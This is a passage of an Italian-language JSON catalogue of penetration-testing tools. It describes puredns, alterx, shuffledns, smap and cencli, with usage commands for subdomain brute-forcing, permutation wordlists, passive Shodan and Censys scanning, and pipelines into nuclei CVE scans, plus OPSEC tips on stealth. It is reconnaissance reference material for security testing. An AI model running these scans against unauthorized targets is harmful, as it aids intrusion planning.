    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Puredns è il tool di riferimento per subdomain enumeration su larga scala, combinando la velocità raw di massdns con un layer di intelligence che elimina i falsi positivi che affliggono altri resolver. Il suo algoritmo proprietario di wildcard detection e la validazione multi-fase producono risultati puliti e affidabili anche su domini con configurazioni DNS complesse o abusate da wildcard.</p><p>L'architettura opera in tre fasi distinte: prima esegue mass resolution tramite massdns con resolver pubblici distribuiti geograficamente, poi applica wildcard filtering che analizza pattern di risposta per identificare e rimuovere falsi positivi, infine valida i risultati con resolver trusted (Google DNS 8.8.8.8) per eliminare eventuali DNS poisoning o risposte corrotte. Questo approccio a tre livelli garantisce che ogni subdomain nell'output finale sia realmente esistente e raggiungibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Operation Mode:</strong> <code>bruteforce</code> per generare e testare subdomain da wordlist, <code>resolve</code> per validare liste pre-esistenti da altri tool. Entrambi beneficiano dello stesso filtering avanzato.</p><p><strong>Wildcard Detection Multi-Level:</strong> Algoritmo che identifica wildcard DNS non solo al livello base (*.domain.com) ma anche a livelli multipli (*.sub.domain.com), un problema che causa milioni di falsi positivi in altri tool.</p><p><strong>Trusted Validation:</strong> Fase finale che ri-testa tutti i risultati positivi con Google DNS, eliminando risposte fraudolente da resolver compromessi o con cache poisoning.</p><p><strong>Massdns Integration:</strong> Sfrutta massdns come engine per query massivamente parallele (100k+ query/secondo su hardware adeguato), ma aggiunge l'intelligence mancante.</p><p><strong>Resolver Management:</strong> Testa automaticamente i resolver per affidabilità e rimuove quelli che producono risposte inconsistenti o lente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREREQUISITI ===\n# Puredns richiede massdns installato\n# Su Kali: apt install massdns\n# Serve anche una lista di resolver pubblici affidabili\n\n# === SUBDOMAIN BRUTE-FORCE ===\n# Brute-force base con wordlist\npuredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com\n\n# Con resolver custom e output file\npuredns bruteforce wordlist.txt target.com -r resolvers.txt -w found.txt\n\n# Wordlist massiva con rate limiting (evita blocchi resolver)\npuredns bruteforce subdomains-top1million-110000.txt target.com \\\n  -r resolvers.txt -l 5000 --wildcard-batch 1000000\n\n# === RESOLVE MODE ===\n# Valida lista da subfinder/amass\nsubfinder -d target.com -silent | puredns resolve -w valid.txt\n\n# Resolve con output dettagliato\npuredns resolve subdomains.txt -r resolvers.txt -w resolved.txt --write-wildcards wildcards.txt\n\n# === WILDCARD HANDLING ===\n# Mostra wildcard trovati (per debug)\npuredns bruteforce wordlist.txt target.com -r resolvers.txt --print-wildcards\n\n# Salta wildcard detection (se sei sicuro non ci siano)\npuredns resolve subdomains.txt --skip-wildcard-filter\n\n# === PIPELINE RECON ===\n# Workflow completo: passivo -&gt; brute -&gt; merge -&gt; probe\nsubfinder -d target.com -silent &gt; passive.txt\npuredns bruteforce wordlist.txt target.com -r resolvers.txt -w bruteforce.txt\ncat passive.txt bruteforce.txt | sort -u | puredns resolve -w final.txt\ncat final.txt | httpx -silent | nuclei -t cves/ -o vulns.txt\n\n# Massivo multi-dominio\ncat scope_domains.txt | while read domain; do\n  echo \"[*] Bruteforcing $domain\"\n  puredns bruteforce wordlist.txt \"$domain\" -r resolvers.txt -w \"${domain}_subs.txt\" -q\ndone\n\n# === OTTIMIZZAZIONE PERFORMANCE ===\n# Alta velocità con molti resolver\npuredns bruteforce wordlist.txt target.com -r 1000_resolvers.txt \\\n  --bin $(which massdns) -l 10000\n\n# Bilanciamento accuratezza/velocità\npuredns bruteforce wordlist.txt target.com \\\n  --wildcard-tests 10 --wildcard-batch 500000\n\n# === INTEGRAZIONE ALTERX ===\n# Genera permutazioni -&gt; resolve con puredns\necho \"api.target.com\" | alterx -enrich | puredns resolve -w permuted_valid.txt\n\n# === OUTPUT ANALYSIS ===\n# Estrai statistiche\nwc -l found.txt\ncat found.txt | rev | cut -d. -f1-2 | rev | sort | uniq -c | sort -rn  # TLD distribution</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Large-Scale Enumeration:</strong> Brute-force con wordlist da milioni di entry su organizzazioni enterprise. Il wildcard filtering previene output inquinato da falsi positivi.</li><li><strong>Result Validation:</strong> Dopo enumeration passiva con subfinder/amass, valida che i subdomain trovati siano effettivamente live e non stale data.</li><li><strong>Bug Bounty Automation:</strong> Integrato in pipeline automatizzate per scansione continua di scope, identifica rapidamente nuovi subdomain man mano che vengono deployati.</li><li><strong>Resolver Quality Check:</strong> L'analisi automatica dei resolver identifica quelli problematici, utile per costruire liste di resolver affidabili.</li><li><strong>Baseline Establishment:</strong> Crea snapshot completi dell'infrastruttura DNS per confronto futuro e change detection.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>DNS Traffic Volume:</strong> Il brute-force genera un volume enorme di query DNS. I nameserver autoritativi del target vedono ogni singola query.</li><li><strong>Resolver Logging:</strong> I resolver pubblici utilizzati loggano le richieste. Per operazioni sensibili, considerare resolver privati.</li><li><strong>Rate Limiting:</strong> Senza <code>-l</code> appropriato, alcuni resolver potrebbero bloccare le query. Distribuire il carico su molti resolver.</li><li><strong>Massdns Dependency:</strong> Richiede massdns installato. Verificare che sia presente e nel PATH prima dell'uso.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-alterx",
    "name": "alterx",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/alterx",
    "desc": "Generatore di wordlist per subdomain basato su pattern DSL per permutazioni intelligenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>AlterX di ProjectDiscovery è un generatore di wordlist per subdomain di nuova generazione che utilizza un Domain Specific Language (DSL) per creare permutazioni intelligenti. A differenza di tool legacy come altdns che applicano pattern statici predefiniti, AlterX analizza i subdomain in input per scoprire automaticamente le naming convention specifiche del target, generando permutazioni che hanno alta probabilità di esistere perché seguono la stessa logica già usata dall'organizzazione.</p><p>Il DSL permette di definire template sofisticati con variabili come {{word}}, {{sub}}, {{suffix}}, {{number}} e operatori per combinazioni, increment e mutation. La modalità \"enrich\" analizza automaticamente i subdomain forniti, estrae pattern comuni (prefissi numerati, suffissi ambiente, separatori usati) e arricchisce il vocabolario con parole estratte dai nomi esistenti. Il risultato è una wordlist mirata che può scoprire in poche migliaia di entry ciò che richiederebbe milioni di tentativi con wordlist generiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent Pattern DSL:</strong> Linguaggio espressivo per definire template di permutazione. Supporta variabili ({{sub}}, {{word}}, {{number}}, {{suffix}}), operatori di mutazione (case change, separator swap), e combinatori per generare varianti multiple.</p><p><strong>Auto Pattern Mining:</strong> La modalità <code>-enrich</code> analizza i subdomain input per scoprire pattern: identifica prefissi/suffissi comuni (dev-, -api, -staging), sequenze numeriche (server1, server2), separatori usati (dash, underscore, dot).</p><p><strong>Word Extraction:</strong> Estrae automaticamente \"words\" significative dai subdomain esistenti e le usa come base per permutazioni. Se esiste \"billing-api.target.com\", estrae \"billing\" e \"api\" per generare combinazioni.</p><p><strong>Payload Templates:</strong> Template predefiniti per scenari comuni (environment permutations, numeric sequences, service discovery) che possono essere combinati con pattern custom.</p><p><strong>Limit Controls:</strong> Controllo preciso sulla dimensione output con <code>-limit</code> per evitare wordlist esplosive quando i pattern combinati producono milioni di entry.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === GENERAZIONE BASE ===\n# Genera permutazioni default da singolo subdomain\necho \"api.target.com\" | alterx\n# Output: api-dev.target.com, api-staging.target.com, api1.target.com, etc.\n\n# Da lista di subdomain noti\ncat known_subdomains.txt | alterx -o permutations.txt\n\n# === PATTERN CUSTOM ===\n# Pattern specifico: word-environment.domain\necho \"api.target.com\" | alterx -p '{{word}}-dev.{{root}}'\necho \"api.target.com\" | alterx -p '{{word}}-staging.{{root}}'\necho \"api.target.com\" | alterx -p '{{word}}-uat.{{root}}'\n\n# Sequenze numeriche\necho \"server.target.com\" | alterx -p '{{word}}{{number}}.{{root}}'\n# Output: server1.target.com, server2.target.com, ...\n\n# Combinazione prefisso + suffisso\necho \"api.target.com\" | alterx -p 'internal-{{sub}}.{{root}}' -p '{{sub}}-internal.{{root}}'\n\n# === ENRICHMENT MODE ===\n# Auto-discovery pattern (modalità più potente)\ncat subdomains.txt | alterx -enrich -o enriched_wordlist.txt\n\n# Enrich con limite output\ncat subdomains.txt | alterx -enrich -limit 50000 -o wordlist.txt\n\n# === PATTERN AVANZATI ===\n# Multi-level subdomain\necho \"api.prod.target.com\" | alterx -p '{{word}}.dev.{{root}}'\n\n# Variazioni separatori\necho \"api-server.target.com\" | alterx -p '{{word}}_server.{{root}}' -p '{{word}}.server.{{root}}'\n\n# Combinazioni multiple\necho \"app.target.com\" | alterx -p '{{word}}-{{number}}.{{root}}' \\\n  -en num-count=10  # genera app-1 fino a app-10\n\n# === PIPELINE COMPLETA ===\n# Workflow: passive -&gt; enrich -&gt; resolve -&gt; probe\nsubfinder -d target.com -silent | tee passive.txt | \\\n  alterx -enrich -limit 100000 | \\\n  puredns resolve -r resolvers.txt | \\\n  httpx -silent | nuclei -t cves/\n\n# Generate + resolve immediate\ncat known.txt | alterx -enrich | dnsx -silent -o new_found.txt\n\n# === PATTERN SPECIFICI PER SCENARI ===\n# DevOps environments\ncat subdomains.txt | alterx -p '{{word}}-dev.{{root}}' \\\n  -p '{{word}}-stage.{{root}}' -p '{{word}}-prod.{{root}}' \\\n  -p '{{word}}-test.{{root}}' -p '{{word}}-qa.{{root}}'\n\n# Cloud regions\ncat subdomains.txt | alterx -p '{{word}}-us-east-1.{{root}}' \\\n  -p '{{word}}-eu-west-1.{{root}}' -p '{{word}}-ap-southeast-1.{{root}}'\n\n# Versioning\ncat subdomains.txt | alterx -p '{{word}}-v1.{{root}}' \\\n  -p '{{word}}-v2.{{root}}' -p '{{word}}-beta.{{root}}'\n\n# === OUTPUT ANALYSIS ===\n# Conta permutazioni generate\ncat known.txt | alterx -enrich | wc -l\n\n# Preview senza salvare\necho \"api.target.com\" | alterx -p '{{word}}-{{number}}.{{root}}' | head -20</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Targeted Brute-Force:</strong> Genera wordlist specifiche per il target invece di usare liste generiche da milioni di entry. Maggiore probabilità di successo con meno query.</li><li><strong>Pattern Exploitation:</strong> Quando scopri che un target usa naming convention specifiche (es. service-env-region), AlterX genera tutte le combinazioni possibili di quel pattern.</li><li><strong>Environment Discovery:</strong> Trova ambienti dev/staging/test che usano gli stessi nomi dei servizi production ma con prefissi/suffissi diversi.</li><li><strong>Numeric Sequence Enumeration:</strong> Scopre server numerati (db1, db2, db3...) che spesso esistono in infrastrutture di una certa scala.</li><li><strong>Wordlist Optimization:</strong> Riduce wordlist massive a subset mirati basati sui pattern realmente usati dal target.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Network Activity:</strong> AlterX è completamente offline - genera solo wordlist senza effettuare query di rete.</li><li><strong>Output Size Control:</strong> Senza <code>-limit</code>, combinazioni di pattern possono generare milioni di entry. Sempre verificare la dimensione output prima di usarla in resolution.</li><li><strong>Quality over Quantity:</strong> Wordlist mirate sono più efficaci di liste enormi. Preferire pattern specifici a combinazioni esplosive.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-shuffledns",
    "name": "shuffledns",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/shuffledns",
    "desc": "Wrapper massdns per subdomain brute-force e resolution con wildcard filtering automatico.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ShuffleDNS di ProjectDiscovery è un wrapper intelligente attorno a massdns che semplifica drasticamente le operazioni di subdomain enumeration su larga scala. Mentre massdns raw è potente ma produce output rumoroso pieno di falsi positivi da DNS wildcard, ShuffleDNS integra wildcard filtering automatico e gestione intelligente dei resolver, producendo risultati puliti pronti per le fasi successive del workflow.</p><p>Il tool opera in due modalità: brute-force con wordlist per generare e testare nuovi subdomain, e resolve mode per validare liste pre-esistenti da altri tool come subfinder o amass. In entrambi i casi, il wildcard filtering analizza le risposte DNS per identificare e rimuovere i falsi positivi causati da domini che rispondono a qualsiasi query. L'architettura mantiene la velocità brutale di massdns (decine di migliaia di query al secondo) aggiungendo l'intelligence necessaria per risultati utilizzabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dual Operation Mode:</strong> <code>-w</code> per brute-force con wordlist (genera subdomain e li risolve), <code>-list</code> per validare liste di subdomain pre-generate. Stesso motore, casi d'uso diversi.</p><p><strong>Wildcard Filtering Automatico:</strong> Rileva automaticamente DNS wildcard testando subdomain casuali e confrontando le risposte. Elimina tutti i risultati che matchano il pattern wildcard.</p><p><strong>Massdns Backend:</strong> Sfrutta massdns per parallelismo estremo. Default 10.000 query concorrenti, configurabile fino al limite della rete/hardware.</p><p><strong>Resolver Management:</strong> Accetta liste di resolver custom e distribuisce le query per evitare rate limiting e ottenere risultati da prospettive geografiche diverse.</p><p><strong>Resume Support:</strong> Può riprendere scansioni interrotte, utile per operazioni di ore su wordlist massive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREREQUISITI ===\n# Richiede massdns installato\n# Su Kali: apt install massdns\n# Richiede lista resolver (es. da github.com/trickest/resolvers)\n\n# === BRUTE-FORCE MODE ===\n# Brute-force base\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt\n\n# Con output file\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -o found.txt\n\n# Wordlist massiva con concurrency aumentata\nshuffledns -d target.com -w subdomains-top1million-110000.txt \\\n  -r resolvers.txt -t 50000 -o results.txt\n\n# === RESOLVE MODE ===\n# Valida lista esistente (es. da subfinder)\nshuffledns -d target.com -list subdomains.txt -r resolvers.txt -o valid.txt\n\n# Pipeline con subfinder\nsubfinder -d target.com -silent | shuffledns -d target.com -r resolvers.txt\n\n# === WILDCARD HANDLING ===\n# Verifica se wildcard presente (test manuale)\necho \"randomnonexistent98765.target.com\" | shuffledns -d target.com -r resolvers.txt\n\n# Strict mode per wildcard detection\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -sw\n\n# === PIPELINE RECON ===\n# Workflow completo: brute + passive + merge\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -o brute.txt &amp;\nsubfinder -d target.com -silent -o passive.txt &amp;\nwait\ncat brute.txt passive.txt | sort -u | shuffledns -d target.com -r resolvers.txt -o final.txt\n\n# Vers nuclei per vuln scan\ncat final.txt | httpx -silent | nuclei -t cves/ -severity high,critical\n\n# === MULTI-DOMAIN ===\n# Batch processing multipli domini\ncat domains.txt | while read domain; do\n  shuffledns -d \"$domain\" -w wordlist.txt -r resolvers.txt -o \"${domain}_subs.txt\" -silent\ndone\n\n# === OUTPUT OPTIONS ===\n# JSON per parsing programmatico\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -json -o results.json\n\n# Silent mode per pipeline\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -silent | httpx -silent\n\n# === PERFORMANCE TUNING ===\n# Alta velocità (richiede buona connessione e molti resolver)\nshuffledns -d target.com -w massive_wordlist.txt -r 5000_resolvers.txt \\\n  -t 100000 -o results.txt\n\n# Retry per resolver instabili\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt -retries 3\n\n# === INTEGRAZIONE MASSDNS ===\n# Specifica path massdns custom\nshuffledns -d target.com -w wordlist.txt -r resolvers.txt \\\n  -m /custom/path/massdns</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Mass Subdomain Enumeration:</strong> Brute-force su larga scala per organizzazioni enterprise con potenzialmente migliaia di subdomain. La velocità di massdns permette di testare milioni di combinazioni in ore.</li><li><strong>Result Validation:</strong> Dopo enumeration passiva con subfinder/amass/chaos, valida quali subdomain sono effettivamente live prima di procedere con scanning HTTP.</li><li><strong>Continuous Monitoring:</strong> Integrato in pipeline di monitoring, esegue scansioni periodiche per identificare nuovi subdomain deployati.</li><li><strong>ProjectDiscovery Workflow:</strong> Si integra nativamente con altri tool PD: subfinder per passive, shuffledns per active, httpx per probe, nuclei per scan.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Extreme DNS Volume:</strong> Genera un volume massiccio di query DNS. I nameserver autoritativi del target ricevono ogni query e potrebbero loggare o bloccare.</li><li><strong>Resolver Logging:</strong> I resolver pubblici utilizzati vedono tutte le query. Per operazioni sensibili, considerare resolver privati o DoH.</li><li><strong>Rate Limiting Risk:</strong> Concurrency troppo alta può triggerare blocchi sui resolver. Usare molti resolver diversi e <code>-t</code> ragionevole.</li><li><strong>Massdns Dependency:</strong> Richiede massdns installato e nel PATH. Verificare prima dell'uso con <code>which massdns</code>.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "smap",
    "name": "smap",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/s0md3v/smap",
    "desc": "Port scanner passivo che usa Shodan API per scansionare senza contattare i target direttamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Smap di s0md3v è un port scanner rivoluzionario che inverte il paradigma tradizionale: invece di inviare pacchetti ai target per scoprire porte aperte, interroga l'API gratuita di Shodan per ottenere le stesse informazioni senza generare alcun traffico di rete verso i target. Progettato come drop-in replacement per Nmap, accetta la stessa sintassi di input e produce output compatibili (XML, greppable, standard), permettendo di sostituirlo in script e workflow esistenti.</p><p>Questa capacità è trasformativa per scenari dove la stealth è critica: penetration test con regole di engagement restrittive, reconnaissance su target che monitorano attivamente le scansioni, o pre-assessment per decidere se procedere con scanning attivo. La velocità è un altro vantaggio enorme: mentre nmap richiede minuti per scansionare un singolo host, smap può processare 200+ host al secondo perché le query sono verso Shodan, non verso i target. La limitazione principale è la freshness dei dati: Shodan indicizza periodicamente, quindi i risultati potrebbero essere vecchi di giorni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero-Touch Scanning:</strong> Nessun pacchetto viene mai inviato ai target. Tutte le informazioni provengono dal database Shodan, rendendo la scansione completamente invisibile a IDS/IPS e firewall.</p><p><strong>Nmap Compatibility:</strong> Accetta la stessa sintassi di target (IP, CIDR, file) e produce output negli stessi formati (-oX per XML, -oG per greppable, -oN per normale). Integrabile in workflow esistenti.</p><p><strong>Vulnerability Detection:</strong> Quando Shodan ha identificato vulnerabilità note nei servizi (basandosi su banner e versioni), smap le riporta nell'output.</p><p><strong>No Authentication:</strong> Funziona con l'API pubblica di Shodan senza richiedere account o API key, anche se con rate limiting.</p><p><strong>Service Information:</strong> Oltre alle porte, riporta banner dei servizi, versioni software, certificati SSL e altre informazioni raccolte da Shodan.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONI BASE ===\n# Scan singolo IP\nsmap 8.8.8.8\n\n# Scan hostname\nsmap target.com\n\n# Scan range CIDR\nsmap 10.0.0.0/24\n\n# === OUTPUT FORMATS ===\n# Output XML (compatibile con tool che parsano nmap XML)\nsmap 192.168.1.0/24 -oX results.xml\n\n# Output greppable (per scripting)\nsmap targets.txt -oG results.gnmap\n\n# Output normale in file\nsmap target.com -oN results.txt\n\n# === INPUT MULTIPLO ===\n# Da file di IP/hostname\nsmap -iL targets.txt\n\n# Mix di target\nsmap 192.168.1.1 target.com 10.0.0.0/24\n\n# === PIPELINE RECON ===\n# Workflow stealth: subfinder -&gt; smap -&gt; identify services\nsubfinder -d target.com -silent | dnsx -a -resp-only | smap -oX scan.xml\n\n# Quick assessment prima di nmap attivo\nsmap target.com  # vedi cosa è già noto\nnmap -sV target.com -p $(smap target.com | grep open | cut -d/ -f1 | tr '\\n' ',')  # scan attivo solo su porte note\n\n# Verifica esposizione infrastruttura\ncat company_ips.txt | smap -oG exposure.gnmap\ngrep \"open\" exposure.gnmap | wc -l  # conta servizi esposti\n\n# === ANALISI RISULTATI ===\n# Estrai servizi specifici\nsmap 10.0.0.0/24 -oG - | grep \"22/open\" | cut -d\" \" -f2  # host con SSH\n\n# Cerca servizi vulnerabili\nsmap target.com | grep -i \"vuln\"\n\n# === CONFRONTO CON NMAP ===\n# Smap per overview passiva\nsmap target.com -oX passive.xml\n\n# Nmap per conferma attiva\nnmap -sV target.com -oX active.xml\n\n# Diff per vedere cosa manca a Shodan\ndiff &lt;(grep -o 'portid=\"[0-9]*\"' passive.xml | sort) \\\n     &lt;(grep -o 'portid=\"[0-9]*\"' active.xml | sort)\n\n# === BULK SCANNING ===\n# Enterprise-scale assessment (centinaia di host in secondi)\nprips 10.0.0.0/16 | smap -oG massive_scan.gnmap\n\n# Con output silenzioso per post-processing\nsmap -iL 1000_hosts.txt -oX results.xml 2&gt;/dev/null</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Stealth Reconnaissance:</strong> Quando le regole di engagement proibiscono scanning attivo nella fase iniziale, o quando si vuole evitare di triggerare alert prima di essere pronti.</li><li><strong>Pre-Assessment Evaluation:</strong> Prima di un penetration test, verifica cosa è già pubblicamente noto sull'infrastruttura del cliente tramite Shodan.</li><li><strong>Attack Surface Discovery:</strong> Identifica rapidamente servizi esposti su range IP enormi senza generare traffico sospetto.</li><li><strong>Compliance Verification:</strong> Controlla periodicamente l'esposizione di servizi critici senza impattare la produzione.</li><li><strong>Comparison Baseline:</strong> Confronta risultati smap (passivi) con nmap (attivi) per identificare servizi che Shodan non ha ancora indicizzato.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Visibility:</strong> Completamente invisibile ai target - nessun pacchetto, nessun log, nessun alert. Ideale per stealth.</li><li><strong>Shodan Visibility:</strong> Le query sono verso Shodan. Per operazioni molto sensibili, considerare che Shodan potrebbe loggare le query (anche se non le correla ai target).</li><li><strong>Data Freshness:</strong> I dati Shodan possono essere vecchi di giorni o settimane. Non affidabili per servizi appena deployati o modificati.</li><li><strong>Coverage Limitata:</strong> Shodan indicizza ~4000 porte, non tutte le 65535. Servizi su porte non standard potrebbero mancare.</li><li><strong>No IPv6:</strong> Supporto IPv6 limitato o assente. Usare nmap per target IPv6.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "censys-cencli",
    "name": "cencli",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/censys/cencli",
    "desc": "CLI ufficiale Censys per query su host, certificati e web properties con vulnerability scanning.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cencli (Censys CLI) è lo strumento ufficiale da linea di comando per accedere alla piattaforma Censys, uno dei più completi database di intelligence su asset Internet al mondo. Censys esegue scansioni continue dell'intero spazio IPv4 e IPv6, indicizzando host, servizi, certificati SSL/TLS e web properties. La CLI porta questa potenza direttamente nel terminale, permettendo query complesse, lookup di asset specifici, e analisi aggregate senza dover usare l'interfaccia web.</p><p>A differenza di tool come Shodan che si concentrano principalmente su porte e banner, Censys eccelle nell'analisi dei certificati SSL/TLS, fondamentale per scoprire infrastruttura nascosta (un certificato wildcard può rivelare subdomain non altrimenti visibili), tracciare relazioni tra asset (certificati condivisi indicano proprietà comune), e identificare vulnerabilità crittografiche. Il comando Censeye integra vulnerability scanning automatizzato sui dati Censys, mentre le aggregazioni permettono trend analysis su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Intelligence:</strong> Lookup dettagliato di qualsiasi IP: porte aperte, servizi, banner, certificati SSL, autonomous system, geolocalizzazione, historical data per vedere come è cambiato nel tempo.</p><p><strong>Certificate Search:</strong> Query potenti sul database certificati: trova tutti i cert per un dominio, cerca per issuer, validity, SANs (Subject Alternative Names), algoritmi. Fondamentale per asset discovery.</p><p><strong>Aggregations:</strong> Query aggregate per analisi statistiche: distribuzione di servizi per country, trend temporali, top autonomous systems per un certo tipo di vulnerabilità.</p><p><strong>Censeye Integration:</strong> Vulnerability assessment automatizzato che correla i dati Censys con database CVE per identificare servizi vulnerabili.</p><p><strong>Historical Data:</strong> Accesso a snapshots storici per analizzare come l'infrastruttura di un target è evoluta nel tempo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Configurazione credenziali (richiede account Censys gratuito)\ncensys config auth add\n# Inserire API ID e API Secret da censys.io/account/api\n\n# Verifica configurazione\ncensys config show\n\n# === HOST LOOKUP ===\n# Dettagli completi su un IP\ncensys hosts view 8.8.8.8\n\n# Output JSON per parsing\ncensys hosts view 8.8.8.8 -o json | jq '.services[].port'\n\n# Solo servizi aperti\ncensys hosts view 8.8.8.8 | grep -A5 \"Services:\"\n\n# === CERTIFICATE SEARCH ===\n# Trova tutti i certificati per un dominio\ncensys certs search \"parsed.subject.common_name: target.com\"\n\n# Certificati con SAN specifico (trova subdomain)\ncensys certs search \"parsed.extensions.subject_alt_name.dns_names: target.com\"\n\n# Certificati wildcard (rivelano infrastruttura)\ncensys certs search \"parsed.subject.common_name: *.target.com\"\n\n# Certificati scaduti (potenziale vulnerabilità)\ncensys certs search \"parsed.validity.end: [* TO 2024-01-01]\"\n\n# === HOST SEARCH ===\n# Trova host per servizio\ncensys hosts search \"services.service_name: SSH and autonomous_system.name: Target Inc\"\n\n# Host con vulnerabilità specifiche\ncensys hosts search \"services.software.cpe: *apache* and services.software.version: 2.4.49\"\n\n# Host per certificato\ncensys hosts search \"services.tls.certificates.leaf_data.subject.common_name: target.com\"\n\n# === AGGREGATIONS ===\n# Distribuzione servizi per un'organizzazione\ncensys hosts aggregate \"autonomous_system.name: Target Inc\" --field services.service_name\n\n# Top paesi per un certo servizio\ncensys hosts aggregate \"services.service_name: RDP\" --field location.country\n\n# === PIPELINE RECON ===\n# Workflow: trova cert -&gt; estrai subdomain -&gt; probe\ncensys certs search \"parsed.extensions.subject_alt_name.dns_names: target.com\" -o json | \\\n  jq -r '.[] | .parsed.extensions.subject_alt_name.dns_names[]' | \\\n  sort -u | httpx -silent | nuclei -t cves/\n\n# Trova tutti gli IP di un'organizzazione\ncensys hosts search \"autonomous_system.name: Target Inc\" -o json | \\\n  jq -r '.[].ip' | sort -u &gt; target_ips.txt\n\n# === CENSEYE VULNERABILITY SCAN ===\n# Scan vulnerabilità su target\ncensys censeye 192.168.1.1\n\n# Scan batch\ncensys censeye -iL targets.txt\n\n# === HISTORICAL ANALYSIS ===\n# Vedi come è cambiato un host\ncensys hosts diff 8.8.8.8 --start 2024-01-01 --end 2024-06-01\n\n# === OUTPUT &amp; EXPORT ===\n# CSV per spreadsheet\ncensys hosts search \"services.service_name: MySQL\" -o csv &gt; mysql_hosts.csv\n\n# JSON per processing\ncensys certs search \"parsed.issuer.organization: Let's Encrypt\" -o json &gt; letsencrypt_certs.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Attack Surface Discovery:</strong> Usando certificate SANs e host search per autonomous system, scopre l'intera infrastruttura internet-facing di un'organizzazione, inclusi asset dimenticati.</li><li><strong>Certificate Intelligence:</strong> Monitora certificati per un dominio: nuovi cert potrebbero indicare nuova infrastruttura, cert scaduti sono vulnerabilità, cert condivisi rivelano relazioni.</li><li><strong>Threat Hunting:</strong> Cerca indicatori di compromissione su scala internet: C2 servers, malware infrastructure, phishing domains basandosi su pattern in certificati o banner.</li><li><strong>Vulnerability Assessment Passivo:</strong> Identifica servizi con versioni vulnerabili note senza scansionare direttamente, utile per pre-assessment.</li><li><strong>Historical Analysis:</strong> Analizza come l'infrastruttura di un target è evoluta, identificando pattern di deployment o momenti di esposizione.</li><li><strong>Competitive Intelligence:</strong> Studia l'infrastruttura tecnologica di competitor analizzando i loro certificati e servizi esposti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Zero Target Interaction:</strong> Tutte le query sono verso l'API Censys, nessun traffico verso i target analizzati. Completamente passivo.</li><li><strong>API Authentication:</strong> Richiede account Censys e API key. Le query sono loggate da Censys con il tuo account.</li><li><strong>Rate Limits:</strong> Account gratuiti hanno limiti sulle query. Account enterprise rimuovono i limiti.</li><li><strong>Data Freshness:</strong> I dati Censys sono aggiornati periodicamente (giorni/settimane). Non real-time.</li><li><strong>Legal Considerations:</strong> L'uso dei dati Censys è soggetto ai loro Terms of Service. Verificare compliance per il proprio use case.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "above",
    "name": "above",
    "version": "2.8",
    "icon": "../app/icons/above-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/above/",
    "desc": "Sniffer passivo di rete per intercettare protocolli L2/L3 (CDP, LLDP, ARP, DHCP) e rilevare dispositivi e VLAN.",
